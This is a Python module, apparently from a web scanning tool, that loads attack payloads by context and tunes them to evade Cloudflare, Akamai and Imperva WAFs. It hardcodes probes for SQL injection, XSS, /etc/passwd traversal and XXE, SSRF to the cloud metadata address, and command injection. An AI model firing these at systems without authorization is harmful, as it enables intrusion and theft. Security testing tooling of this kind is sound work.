# core/payload_source.py — unified payload source for all modules
from pathlib import Path
from core.mutator import mutate_param, detect_waf_from_headers


PAYLOAD_DIR = Path(__file__).parent.parent / "payloads"

# mapping: module context -> payload files
CONTEXT_FILES = {
    "sql":         ["sqli.txt", "seclists_sqli.txt", "seclists_sqli_all.txt", "seclists_sqli_quick.txt"],
    "sql_waf":     ["waf_cloudflare.txt", "waf_akamai.txt", "waf_imperva.txt", "encoded_composite.txt"],
    "html_body":   ["xss_context.txt", "xss.txt"],
    "html_waf":    ["waf_cloudflare.txt", "waf_akamai.txt", "waf_imperva.txt", "encoded_composite.txt"],
    "path":        ["lfi.txt", "seclists_lfi.txt"],
    "path_waf":    ["waf_cloudflare.txt", "encoded_composite.txt"],
    "template":    ["ssti.txt", "ssti_extra.txt"],
    "xml":         ["xxe.txt", "seclists_xxe.txt"],
    "ssrf":        ["seclists_ssrf.txt"],
    "redirect":    ["open_redirect.txt", "seclists_open_redirect.txt"],
    "cmd":         ["cmd_injection.txt"],
    "ldap":        ["ldap.txt"],
    "xslt":        ["xslt.txt"],
    "csti":        ["csti.txt"],
    "ssi":         ["ssi_injection.txt"],
    "crlf":        ["crlf.txt"],
    "nosql":       ["nosql.txt"],
    "saml":        [],
    "oauth":       [],
}

# built-in fallbacks if file is empty or missing
BUILTIN = {
    "sql":       ["'", "\"", "')--", "1' OR '1'='1", "' OR 1=1--"],
    "html_body": ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>"],
    "path":      ["../../../../etc/passwd", "/etc/passwd"],
    "template":  ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
    "xml":       ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'],
    "ssrf":      ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/"],
    "redirect":  ["//evil.example", "https://evil.example"],
    "cmd":       ["; id", "| id", "`id`", "$(id)"],
    "ssi":       ['<!--#exec cmd="id"-->'],
    "crlf":      ["%0d%0aInjected:yes"],
    "nosql":     ['{"$ne":null}'],
}

_cache = {}


def _load_file(path):
    if not path.is_file():
        return []
    out = []
    for line in path.read_text(errors="ignore").splitlines():
        s = line.strip()
        if s and not s.startswith("#"):
            out.append(s)
    return out


def get_payloads(context, waf=None, limit=None, mutate_by=0, base_first=True):
    """
    Get payloads for context, optionally WAF-tuned, optionally mutated.

    context: 'sql', 'html_body', 'path', 'template', 'xml', 'ssrf', 'redirect', 'cmd', 'ssi' ...
    waf:     'cloudflare', 'akamai', 'imperva', None
    limit:   max base payloads
    mutate_by: how many mutations per payload
    """
    key = (context, waf, limit, mutate_by)
    if key in _cache:
        return _cache[key]

    files = list(CONTEXT_FILES.get(context, []))
    if waf:
        # add WAF-specific files for this context
        waf_key = f"{context}_waf" if f"{context}_waf" in CONTEXT_FILES else None
        if waf_key:
            files.extend(CONTEXT_FILES[waf_key])
        else:
            files.extend(["waf_cloudflare.txt", "waf_akamai.txt", "waf_imperva.txt", "encoded_composite.txt"])

    payloads = []
    for fname in files:
        payloads.extend(_load_file(PAYLOAD_DIR / fname))

    # dedupe preserve order
    payloads = list(dict.fromkeys(payloads))

    if not payloads:
        payloads = list(BUILTIN.get(context, []))

    if limit:
        payloads = payloads[:limit]

    if mutate_by > 0:
        out = []
        for p in payloads:
            out.extend(mutate_param(p, n=mutate_by, base_first=base_first))
        payloads = list(dict.fromkeys(out))

    _cache[key] = payloads
    return payloads


def detect_waf(session):
    """Return waf name from session findings or None."""
    for f in session.findings:
        if f.get("kind") == "waf":
            detail = f.get("detail", "").lower()
            if "cloudflare" in detail: return "cloudflare"
            if "akamai" in detail: return "akamai"
            if "imperva" in detail: return "imperva"
            if "sucuri" in detail: return "sucuri"
            if "aws" in detail: return "aws"
    return None


def stats():
    """Return dict of context -> payload count (base, no mutations)."""
    out = {}
    for ctx in CONTEXT_FILES:
        for waf in (None, "cloudflare", "akamai", "imperva"):
            key = f"{ctx}{'+'+waf if waf else ''}"
            out[key] = len(get_payloads(ctx, waf=waf))
    return out
